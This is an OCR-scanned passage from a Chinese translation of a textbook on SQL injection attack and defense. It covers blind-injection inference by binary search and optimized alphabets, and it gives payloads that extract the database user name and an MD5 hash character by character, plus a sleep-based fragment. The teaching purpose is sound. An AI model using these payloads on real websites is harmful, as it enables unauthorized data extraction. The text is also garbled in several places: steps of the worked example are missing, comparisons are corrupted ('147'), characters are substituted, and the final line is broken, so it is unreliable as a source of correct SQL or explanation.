请求的数量并且通常是非二进制安全的(binary-safe)。有两种方法可用来改进推断检索的效率：
一种是逐位方法(bit-by-bit)，一种是二分搜索方法。这两种方法都是二进制安全的。
二分搜索方法（有时也称为分半算法）主要用于推断单个字节的值，不需要搜索整张字母表。
它通过玩一个8问题（eightquestions）游戏来不断地将搜索空间分为两部分，直到识别出该字节
的值为止（因为一个字节可包含256个不同的值，所以可通过8个请求来确定该值。要直观地展
示该过程，可以通过计算不断将256分成两部分的次数（在得到一个非整数商之前）来实现）。假
设我们关心的字节的值为14，可提出问题并通过一种方便的推断机制来推断答案，答案为真时，
该机制返回是，为假时则返回否。接下来的过程如下所示：
（1）该字节是否大于127？否，因为147。
195
---
## Page 210
SQL注入攻击与防御（第2版）
(6）该字节是否大于11？是，因为14>11。
（7）该字节是否大于13？是，因为14>13。
(8）该字节是否大于147否，因为14=14。
由于该字节大于13但小于等于14，因而可推断该字节的值为14。该技术借助数据库函数
米提供任意字节的整数值。在Microsoft SQL Server、MySQL、PostgreSQL 和 Oracle 中，通过
ASCIIO函数来提供该值。
字符，将执行下列SQL语句：
SELECT CoUNT (chick_id) FROM chickens wHERE status=*Incubating* AND
ASCII (SUBSTRING (system_user, 1, 1) ) >127-- *
我们需要发送8条SQL语句米完全确定该字符的值。将所有这些查询转换成页面请求，
产生的内容如下所示：
Incubating′ AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >127-- (Fa1se)
Incubating* AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >95- (True)
InCubating′ AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >63-- (True)
Incubating′ AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >111-- (True)
Incubating′ AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >119-= (Fa1se)
Incubating* AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >115-- (False)
Incubating′ AND ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) >113-- (True)
Incubating* AND ASCII (SUBSTRING (SYSTEM_USER, 1,1)) >114== (True)
从这一系列请求中，我们可以推断用户名的第一个字符的字节值为115，它在ASCII表中
对应的字符为s。使用该技术只需8个请求即可提取一个字节。相比根据字母表比较所有字节
的方式，该技术有了极大改进。无论提取什么样的值，如果仅能观察到两种状态，那么提取过
程总是需要8个问题。读者可以使用随机选择的字节值试一试。
如果向请求添加第三种状态（Eror)，就可以在二分搜索中测试是否相等，从而将最佳情况
下的请求次数减至1次。最坏情况下的请求次数为8次。有趣的是，对于均匀分布的数据来说，
这仅仅能将期望的请求数量减少到约7.035次。本章后面提供了这样的一个例子。
这一点非常好。通过观察两种状态的方式，我们有了一种可以在固定时间内高效提取给定
字节值的方法。该方法发出请求的数目等于存在的位数。如果不使用压缩技术或注入字符申来
处理多于两种的状态，那么从信息理论角度看，该方法很不错。但是，由于每个请求均依赖于
上一请求的结果，因而二分搜索技术仍然存在性能问题。我们无法在获取第一个请求的答案之
前发出第二个请求，因为第二个请求可能要根据63或191来测试字节。所以，单个字节的请
求无法并行运行，这让我们感到有点失望。
提示：
虽然确实可以并行地请求宇节，但在尝试并行地请求位(bit)之前，我们没有很好的理由来
阻止上述做法，马上我们将进一步讨论该问题。
通常，这种非并行性的要求并不是推断攻击技术固有的局限，而是二分搜索法的限制。被
抽取的数据在数据库中依然保持不变，这意味着我们并没有改变数据。当然，访问数据库的应
用程序可以修改它们，如果是这样的话，所有确定性将无从谈起，并且推断攻击技术会变得不
196
---
## Page 211
第5章SQL盲注利用
可靠。
二分搜索技术将8个bit划分为一个字节，通过8个请求来推断这8个位的值。我们是否
可以尝试用每个请求来推断单个指定位（比如字节的第二位）的值呢？如果可行的话，我们可以
为字节的8个位发出8个并行请求，这样一来，检索字节值花费的时间比二进制搜索方法的检
索时间还少，因为请求是并行产生的面非一个接一个地产生。
优化二分搜索法
优化的小技巧
当存在两个有效状态时，提取字符总是需要8个请求这一点并不完全正确，如果已
经知道要抽取的内容是文本，特别是在字符集（characterset）和字符的对比方法（collation）
已知时，可以采取一些优化二分搜索法的技术，此时不再使用全部的8个bit，本质上
我们可以假设文本字符在所有可能字节值集合申的位置，并依靠字符事比较来实现二分
搜索方法。这种办法要求要提取的字符具有一个有序的字母表，并且支持宇符的比较。
例如，如果数据仅仅由罗马字母和十进制数字组成，那么只存在62个可能的字符，在
字母表0...9A...Za...z中，对uscrmame第一个字符的二分法搜索过程如下所示：
Incubating′ and SUBSTRING(SYSTEM_USER, 1, 1) >*U′-- (True)
Incubating′ and SUBSTRING (SYSTEM_USER, 1,1) >′J′-- (True)
Incubating′ and SUBSTRING (SYSTEM_USER, 1, 1) >′s′-- (False)
Incubating′ and SUBSTRING (SYSTEM_USER, 1, 1) >′o′-- (True)
Incubating* and SUBSTRING (SYSTEM_USER, 1,1)>*q′-- (True)
Incubating′ and SUBSTRING (SYSTEM_USER, 1, 1)>′′-- (True)
Character is thus 's'
当然，在上面这些查询所用的字母表中忽略了标点符号字符，但是最多6次请求就
可以提取到目标字符，
在某些情况下，字母表是可预设的，但是它与数据库所认识的字母表并不重叠，例
如，如果提取MD5哈希，可能的字母表仅为16个字符，我们可以使用SQL的集合概
念来模拟字母表，还可以构建一个自己的字母表。在下面的例子中，提取了一个MD5
哈希的第一个字符：
Incubating* and SUBSTRING(*c4ca4238a0b923820dcc509a6f75849b′,1,1) in
（′0′,*1*,*2′,*3′,*4′,*5′,*6′,′7*)
Incubating* and SUBSTRING(*c4ca4238a0b923820dcc509a6f75849b′,1,1) in
Incubating′ and SUBSTRING(*c4ca4238a0b923820dcc509a6f75849b′, 1,1) in
(*8′,*9′,*a′,*b′)
Incubating* and SUBSTRING(*c4ca4238a0b923820dcc509a6f75849b', 1,1) in
('e','f')
Incubating* and SUBSTRING(*c4ca4238a0b923820dcc509a6f75849b′,1,1) in
(*d′)
Character is thus 'c'
在MySQL中，可以在查询中声明字符集和字符对比方法。在下面的例子中，强制
将两个中文字符按照Latin字符进行解析并排序：
197
---
## Page 212
SQL注入攻击与防御（第2版）
SELECT _latinl ** 0
ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) 1 64 >\
ASCII (SUBSTRING (SYSTEM_USER, 1, 1))
ASCII (SUBSTRING (SYSTEM_USER, 1, 1)) ^ 64  select:sleep(4.17) os *I**m dreoming*;